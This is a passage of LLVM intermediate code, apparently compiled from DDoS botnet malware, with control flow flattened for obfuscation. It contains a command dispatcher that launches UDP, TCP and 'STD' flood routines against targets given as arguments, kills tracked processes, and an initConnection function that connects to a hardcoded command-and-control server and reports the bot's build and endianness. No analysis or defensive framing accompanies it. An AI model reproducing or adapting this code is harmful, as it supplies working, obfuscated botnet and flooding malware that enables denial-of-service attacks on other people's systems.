  %395 = icmp ne i8* %394, null
  %396 = select i1 %395, i32 1190820474, i32 1164476070
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = call i32 @listFork()
  %399 = icmp ne i32 %398, 0
  %400 = select i1 %399, i32 -328012188, i32 446800157
  store i32 %400, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i8*, i8** %23, align 8
  %403 = load i32, i32* %18, align 4
  %404 = load i32, i32* %19, align 4
  %405 = load i32, i32* %20, align 4
  %406 = load i32, i32* %21, align 4
  %407 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %402, i32 %403, i32 %404, i32 %405, i32 %406, i32 %407)
  call void @_exit(i32 0) #11
  unreachable

; <label>:408:                                    ; preds = %loopEntry
  %409 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %409, i8** %23, align 8
  store i32 -541799062, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  store i32 451434160, i32* %switchVar
  br label %loopEnd

; <label>:411:                                    ; preds = %loopEntry
  %412 = call i32 @listFork()
  %413 = icmp ne i32 %412, 0
  %414 = select i1 %413, i32 -1989561886, i32 614246533
  store i32 %414, i32* %switchVar
  br label %loopEnd

; <label>:415:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load i8*, i8** %17, align 8
  %418 = load i32, i32* %18, align 4
  %419 = load i32, i32* %19, align 4
  %420 = load i32, i32* %20, align 4
  %421 = load i32, i32* %21, align 4
  %422 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %417, i32 %418, i32 %419, i32 %420, i32 %421, i32 %422)
  call void @_exit(i32 0) #11
  unreachable

; <label>:423:                                    ; preds = %loopEntry
  store i32 -1559894138, i32* %switchVar
  br label %loopEnd

; <label>:424:                                    ; preds = %loopEntry
  %425 = load i8**, i8*** %4, align 8
  %426 = getelementptr inbounds i8*, i8** %425, i64 0
  %427 = load i8*, i8** %426, align 8
  %428 = call i32 @strcmp(i8* %427, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.520, i32 0, i32 0)) #9
  %429 = icmp ne i32 %428, 0
  %430 = select i1 %429, i32 25800419, i32 -1263910389
  store i32 %430, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load i32, i32* %3, align 4
  %433 = icmp slt i32 %432, 6
  %434 = select i1 %433, i32 -656608097, i32 -1473261451
  store i32 %434, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  %436 = load i8**, i8*** %4, align 8
  %437 = getelementptr inbounds i8*, i8** %436, i64 3
  %438 = load i8*, i8** %437, align 8
  %439 = call i32 @atoi(i8* %438) #9
  %440 = icmp eq i32 %439, -1
  %441 = select i1 %440, i32 -656608097, i32 1904704459
  store i32 %441, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  %443 = load i8**, i8*** %4, align 8
  %444 = getelementptr inbounds i8*, i8** %443, i64 2
  %445 = load i8*, i8** %444, align 8
  %446 = call i32 @atoi(i8* %445) #9
  %447 = icmp eq i32 %446, -1
  %448 = select i1 %447, i32 -656608097, i32 1215870383
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i32, i32* %3, align 4
  %451 = icmp sgt i32 %450, 5
  %452 = select i1 %451, i32 1113107093, i32 -1827633804
  store i32 %452, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  %454 = load i8**, i8*** %4, align 8
  %455 = getelementptr inbounds i8*, i8** %454, i64 5
  %456 = load i8*, i8** %455, align 8
  %457 = call i32 @atoi(i8* %456) #9
  %458 = icmp slt i32 %457, 0
  %459 = select i1 %458, i32 -656608097, i32 -1827633804
  store i32 %459, i32* %switchVar
  br label %loopEnd

; <label>:460:                                    ; preds = %loopEntry
  %461 = load i32, i32* %3, align 4
  %462 = icmp eq i32 %461, 7
  %463 = select i1 %462, i32 -2013195247, i32 -1644450296
  store i32 %463, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i8**, i8*** %4, align 8
  %466 = getelementptr inbounds i8*, i8** %465, i64 6
  %467 = load i8*, i8** %466, align 8
  %468 = call i32 @atoi(i8* %467) #9
  %469 = icmp slt i32 %468, 1
  %470 = select i1 %469, i32 -656608097, i32 -1644450296
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:472:                                    ; preds = %loopEntry
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 1
  %475 = load i8*, i8** %474, align 8
  store i8* %475, i8** %24, align 8
  %476 = load i8**, i8*** %4, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 2
  %478 = load i8*, i8** %477, align 8
  %479 = call i32 @atoi(i8* %478) #9
  store i32 %479, i32* %25, align 4
  %480 = load i8**, i8*** %4, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 3
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @atoi(i8* %482) #9
  store i32 %483, i32* %26, align 4
  %484 = load i8**, i8*** %4, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 4
  %486 = load i8*, i8** %485, align 8
  store i8* %486, i8** %27, align 8
  %487 = load i32, i32* %3, align 4
  %488 = icmp eq i32 %487, 7
  %489 = select i1 %488, i32 823685140, i32 1618922680
  store i32 %489, i32* %switchVar
  br label %loopEnd

; <label>:490:                                    ; preds = %loopEntry
  %491 = load i8**, i8*** %4, align 8
  %492 = getelementptr inbounds i8*, i8** %491, i64 6
  %493 = load i8*, i8** %492, align 8
  %494 = call i32 @atoi(i8* %493) #9
  store i32 1530062033, i32* %switchVar
  store i32 %494, i32* %.reg2mem4
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 1530062033, i32* %switchVar
  store i32 10, i32* %.reg2mem4
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %28, align 4
  %497 = load i32, i32* %3, align 4
  %498 = icmp sgt i32 %497, 5
  %499 = select i1 %498, i32 1178538301, i32 666580560
  store i32 %499, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  %501 = load i8**, i8*** %4, align 8
  %502 = getelementptr inbounds i8*, i8** %501, i64 5
  %503 = load i8*, i8** %502, align 8
  %504 = call i32 @atoi(i8* %503) #9
  store i32 -1180195284, i32* %switchVar
  store i32 %504, i32* %.reg2mem6
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  store i32 -1180195284, i32* %switchVar
  store i32 0, i32* %.reg2mem6
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %.reload7 = load i32, i32* %.reg2mem6
  store i32 %.reload7, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %507 = load i8*, i8** %24, align 8
  %508 = call i8* @strstr(i8* %507, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %509 = icmp ne i8* %508, null
  %510 = select i1 %509, i32 -682681960, i32 2139638833
  store i32 %510, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i8*, i8** %24, align 8
  %513 = call i8* @strtok(i8* %512, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %513, i8** %31, align 8
  store i32 -1195355862, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = load i8*, i8** %31, align 8
  %516 = icmp ne i8* %515, null
  %517 = select i1 %516, i32 747219134, i32 -388661502
  store i32 %517, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = call i32 @listFork()
  %520 = icmp ne i32 %519, 0
  %521 = select i1 %520, i32 -563441354, i32 -1410535183
  store i32 %521, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i8*, i8** %31, align 8
  %524 = load i32, i32* %25, align 4
  %525 = load i32, i32* %26, align 4
  %526 = load i8*, i8** %27, align 8
  %527 = load i32, i32* %29, align 4
  %528 = load i32, i32* %28, align 4
  %529 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %523, i32 %524, i32 %525, i8* %526, i32 %527, i32 %528, i32 %529)
  call void @_exit(i32 0) #11
  unreachable

; <label>:530:                                    ; preds = %loopEntry
  %531 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %531, i8** %31, align 8
  store i32 -1195355862, i32* %switchVar
  br label %loopEnd

; <label>:532:                                    ; preds = %loopEntry
  store i32 330584534, i32* %switchVar
  br label %loopEnd

; <label>:533:                                    ; preds = %loopEntry
  %534 = call i32 @listFork()
  %535 = icmp ne i32 %534, 0
  %536 = select i1 %535, i32 1553206457, i32 -1018172375
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:538:                                    ; preds = %loopEntry
  %539 = load i8*, i8** %24, align 8
  %540 = load i32, i32* %25, align 4
  %541 = load i32, i32* %26, align 4
  %542 = load i8*, i8** %27, align 8
  %543 = load i32, i32* %29, align 4
  %544 = load i32, i32* %28, align 4
  %545 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %539, i32 %540, i32 %541, i8* %542, i32 %543, i32 %544, i32 %545)
  call void @_exit(i32 0) #11
  unreachable

; <label>:546:                                    ; preds = %loopEntry
  store i32 25800419, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8**, i8*** %4, align 8
  %549 = getelementptr inbounds i8*, i8** %548, i64 0
  %550 = load i8*, i8** %549, align 8
  %551 = call i32 @strcmp(i8* %550, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.521, i32 0, i32 0)) #9
  %552 = icmp ne i32 %551, 0
  %553 = select i1 %552, i32 1168752833, i32 -896181812
  store i32 %553, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  %555 = load i32, i32* %3, align 4
  %556 = icmp slt i32 %555, 4
  %557 = select i1 %556, i32 -1989764654, i32 -1240980264
  store i32 %557, i32* %switchVar
  br label %loopEnd

; <label>:558:                                    ; preds = %loopEntry
  %559 = load i8**, i8*** %4, align 8
  %560 = getelementptr inbounds i8*, i8** %559, i64 2
  %561 = load i8*, i8** %560, align 8
  %562 = call i32 @atoi(i8* %561) #9
  %563 = icmp slt i32 %562, 1
  %564 = select i1 %563, i32 -1989764654, i32 1379775645
  store i32 %564, i32* %switchVar
  br label %loopEnd

; <label>:565:                                    ; preds = %loopEntry
  %566 = load i8**, i8*** %4, align 8
  %567 = getelementptr inbounds i8*, i8** %566, i64 3
  %568 = load i8*, i8** %567, align 8
  %569 = call i32 @atoi(i8* %568) #9
  %570 = icmp slt i32 %569, 1
  %571 = select i1 %570, i32 -1989764654, i32 -1608597988
  store i32 %571, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %574 = load i8**, i8*** %4, align 8
  %575 = getelementptr inbounds i8*, i8** %574, i64 1
  %576 = load i8*, i8** %575, align 8
  store i8* %576, i8** %32, align 8
  %577 = load i8**, i8*** %4, align 8
  %578 = getelementptr inbounds i8*, i8** %577, i64 2
  %579 = load i8*, i8** %578, align 8
  %580 = call i32 @atoi(i8* %579) #9
  store i32 %580, i32* %33, align 4
  %581 = load i8**, i8*** %4, align 8
  %582 = getelementptr inbounds i8*, i8** %581, i64 3
  %583 = load i8*, i8** %582, align 8
  %584 = call i32 @atoi(i8* %583) #9
  store i32 %584, i32* %34, align 4
  %585 = load i8*, i8** %32, align 8
  %586 = call i8* @strstr(i8* %585, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %587 = icmp ne i8* %586, null
  %588 = select i1 %587, i32 1527415729, i32 -2061678710
  store i32 %588, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i8*, i8** %32, align 8
  %591 = call i8* @strtok(i8* %590, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %591, i8** %35, align 8
  store i32 742614304, i32* %switchVar
  br label %loopEnd

; <label>:592:                                    ; preds = %loopEntry
  %593 = load i8*, i8** %35, align 8
  %594 = icmp ne i8* %593, null
  %595 = select i1 %594, i32 -1064984265, i32 -1541342440
  store i32 %595, i32* %switchVar
  br label %loopEnd

; <label>:596:                                    ; preds = %loopEntry
  %597 = call i32 @listFork()
  %598 = icmp ne i32 %597, 0
  %599 = select i1 %598, i32 -1971131027, i32 -54526686
  store i32 %599, i32* %switchVar
  br label %loopEnd

; <label>:600:                                    ; preds = %loopEntry
  %601 = load i8*, i8** %35, align 8
  %602 = load i32, i32* %33, align 4
  %603 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %601, i32 %602, i32 %603)
  call void @_exit(i32 0) #11
  unreachable

; <label>:604:                                    ; preds = %loopEntry
  %605 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %605, i8** %35, align 8
  store i32 742614304, i32* %switchVar
  br label %loopEnd

; <label>:606:                                    ; preds = %loopEntry
  store i32 399447261, i32* %switchVar
  br label %loopEnd

; <label>:607:                                    ; preds = %loopEntry
  %608 = call i32 @listFork()
  %609 = icmp ne i32 %608, 0
  %610 = select i1 %609, i32 1906542272, i32 -1663764849
  store i32 %610, i32* %switchVar
  br label %loopEnd

; <label>:611:                                    ; preds = %loopEntry
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:612:                                    ; preds = %loopEntry
  %613 = load i8*, i8** %32, align 8
  %614 = load i32, i32* %33, align 4
  %615 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %613, i32 %614, i32 %615)
  call void @_exit(i32 0) #11
  unreachable

; <label>:616:                                    ; preds = %loopEntry
  store i32 1168752833, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i8**, i8*** %4, align 8
  %619 = getelementptr inbounds i8*, i8** %618, i64 0
  %620 = load i8*, i8** %619, align 8
  %621 = call i32 @strcmp(i8* %620, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.522, i32 0, i32 0)) #9
  %622 = icmp ne i32 %621, 0
  %623 = select i1 %622, i32 -1040541468, i32 -1439265196
  store i32 %623, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  store i32 -1481833594, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  %626 = load i64, i64* %37, align 8
  %627 = load i64, i64* @numpids, align 8
  %628 = icmp ult i64 %626, %627
  %629 = select i1 %628, i32 -1578779978, i32 1354659042
  store i32 %629, i32* %switchVar
  br label %loopEnd

; <label>:630:                                    ; preds = %loopEntry
  %631 = load i32*, i32** @pids, align 8
  %632 = load i64, i64* %37, align 8
  %633 = getelementptr inbounds i32, i32* %631, i64 %632
  %634 = load i32, i32* %633, align 4
  %635 = icmp ne i32 %634, 0
  %636 = select i1 %635, i32 762757674, i32 -804149885
  store i32 %636, i32* %switchVar
  br label %loopEnd

; <label>:637:                                    ; preds = %loopEntry
  %638 = load i32*, i32** @pids, align 8
  %639 = load i64, i64* %37, align 8
  %640 = getelementptr inbounds i32, i32* %638, i64 %639
  %641 = load i32, i32* %640, align 4
  %642 = call i32 @getpid() #5
  %643 = icmp ne i32 %641, %642
  %644 = select i1 %643, i32 -515521637, i32 -804149885
  store i32 %644, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i32*, i32** @pids, align 8
  %647 = load i64, i64* %37, align 8
  %648 = getelementptr inbounds i32, i32* %646, i64 %647
  %649 = load i32, i32* %648, align 4
  %650 = call i32 @kill(i32 %649, i32 9) #5
  %651 = load i32, i32* %36, align 4
  %652 = add nsw i32 %651, 1
  store i32 %652, i32* %36, align 4
  store i32 -804149885, i32* %switchVar
  br label %loopEnd

; <label>:653:                                    ; preds = %loopEntry
  store i32 473325697, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i64, i64* %37, align 8
  %656 = add i64 %655, 1
  store i64 %656, i64* %37, align 8
  store i32 -1481833594, i32* %switchVar
  br label %loopEnd

; <label>:657:                                    ; preds = %loopEntry
  %658 = load i32, i32* %36, align 4
  %659 = icmp sgt i32 %658, 0
  %660 = select i1 %659, i32 559000749, i32 -854277830
  store i32 %660, i32* %switchVar
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  store i32 258220262, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  store i32 258220262, i32* %switchVar
  br label %loopEnd

; <label>:663:                                    ; preds = %loopEntry
  store i32 -1040541468, i32* %switchVar
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  %665 = load i8**, i8*** %4, align 8
  %666 = getelementptr inbounds i8*, i8** %665, i64 0
  %667 = load i8*, i8** %666, align 8
  %668 = call i32 @strcmp(i8* %667, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.523, i32 0, i32 0)) #9
  %669 = icmp ne i32 %668, 0
  %670 = select i1 %669, i32 682330196, i32 -1827072383
  store i32 %670, i32* %switchVar
  br label %loopEnd

; <label>:671:                                    ; preds = %loopEntry
  call void @exit(i32 0) #12
  unreachable

; <label>:672:                                    ; preds = %loopEntry
  %673 = load i8**, i8*** %4, align 8
  %674 = getelementptr inbounds i8*, i8** %673, i64 0
  %675 = load i8*, i8** %674, align 8
  %676 = call i32 @strcmp(i8* %675, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.524, i32 0, i32 0)) #9
  %677 = icmp ne i32 %676, 0
  %678 = select i1 %677, i32 682323236, i32 2146271427
  store i32 %678, i32* %switchVar
  br label %loopEnd

; <label>:679:                                    ; preds = %loopEntry
  call void @RemoveTempDirs()
  %680 = load i32, i32* @mainCommSock, align 4
  %681 = call i8* @getBuild()
  %682 = call i32 @getEndianness()
  %683 = call i32 (i32, i8*, ...) @sockprintf(i32 %680, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.525, i32 0, i32 0), i8* %681, i32 %682)
  store i32 682323236, i32* %switchVar
  br label %loopEnd

; <label>:684:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %679, %672, %664, %663, %662, %661, %657, %654, %653, %645, %637, %630, %625, %624, %617, %616, %611, %607, %606, %604, %596, %592, %589, %573, %572, %565, %558, %554, %547, %546, %537, %533, %532, %530, %518, %514, %511, %506, %505, %500, %496, %495, %490, %472, %471, %464, %460, %453, %449, %442, %435, %431, %424, %423, %415, %411, %410, %408, %397, %393, %390, %385, %384, %379, %360, %359, %352, %348, %341, %334, %327, %320, %316, %309, %285, %281, %280, %273, %266, %262, %255, %254, %253, %236, %229, %226, %225, %221, %214, %213, %210, %190, %189, %188, %187, %183, %181, %177, %176, %172, %171, %164, %157, %150, %149, %148, %131, %124, %121, %120, %116, %109, %108, %105, %85, %84, %83, %82, %78, %76, %72, %71, %67, %66, %59, %52, %45, %44, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1269050891, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar11 = load i32, i32* %switchVar
  switch i32 %switchVar11, label %switchDefault [
    i32 -1269050891, label %NodeBlock9
    i32 -1196891593, label %NodeBlock7
    i32 1606654911, label %LeafBlock5
    i32 1869015904, label %LeafBlock3
    i32 2008028499, label %NodeBlock
    i32 958092636, label %LeafBlock1
    i32 -270930791, label %LeafBlock
    i32 -428116968, label %20
    i32 -1600727258, label %21
    i32 -2081047343, label %22
    i32 -804104801, label %23
    i32 -1410506456, label %NewDefault
    i32 68524599, label %24
    i32 -1156937062, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload17 = load volatile i32, i32* %.reg2mem
  %Pivot10 = icmp slt i32 %.reload17, 33751041
  %13 = select i1 %Pivot10, i32 2008028499, i32 -1196891593
  store i32 %13, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload13 = load volatile i32, i32* %.reg2mem
  %Pivot8 = icmp slt i32 %.reload13, 50462976
  %14 = select i1 %Pivot8, i32 1869015904, i32 1606654911
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock5:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf6 = icmp eq i32 %.reload, 50462976
  %15 = select i1 %SwitchLeaf6, i32 -1600727258, i32 -1410506456
  store i32 %15, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload12 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload12, 33751041
  %16 = select i1 %SwitchLeaf4, i32 -2081047343, i32 -1410506456
  store i32 %16, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload16 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload16, 16777986
  %17 = select i1 %Pivot, i32 -270930791, i32 958092636
  store i32 %17, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload14 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload14, 16777986
  %18 = select i1 %SwitchLeaf2, i32 -804104801, i32 -1410506456
  store i32 %18, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload15 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload15, 66051
  %19 = select i1 %SwitchLeaf, i32 -428116968, i32 -1410506456
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  store i32 ptrtoint ([11 x i8]* @.str.528 to i32), i32* %1, align 4
  store i32 -1156937062, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 ptrtoint ([14 x i8]* @.str.529 to i32), i32* %1, align 4
  store i32 -1156937062, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  store i32 ptrtoint ([13 x i8]* @.str.530 to i32), i32* %1, align 4
  store i32 -1156937062, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 ptrtoint ([16 x i8]* @.str.531 to i32), i32* %1, align 4
  store i32 -1156937062, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 68524599, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  store i32 ptrtoint ([8 x i8]* @.str.532 to i32), i32* %1, align 4
  store i32 -1156937062, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %24, %NewDefault, %23, %22, %21, %20, %LeafBlock, %LeafBlock1, %NodeBlock, %LeafBlock3, %LeafBlock5, %NodeBlock7, %NodeBlock9, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 197450968, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 197450968, label %first
    i32 1314496703, label %8
    i32 -819452843, label %11
    i32 1022228258, label %17
    i32 1760484294, label %18
    i32 1340324427, label %21
    i32 1355414895, label %32
    i32 768490811, label %39
    i32 -2013066141, label %47
    i32 716480214, label %48
    i32 -1281095498, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 1314496703, i32 -819452843
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 -819452843, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 1022228258, i32 1760484294
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 1340324427, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 1340324427, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #5
  store i32 23, i32* %3, align 4
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #9
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 1355414895, i32 768490811
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #9
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #9
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #9
  store i8 0, i8* %38, align 1
  store i32 768490811, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 716480214, i32 -2013066141
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 -1281095498, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -1281095498, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
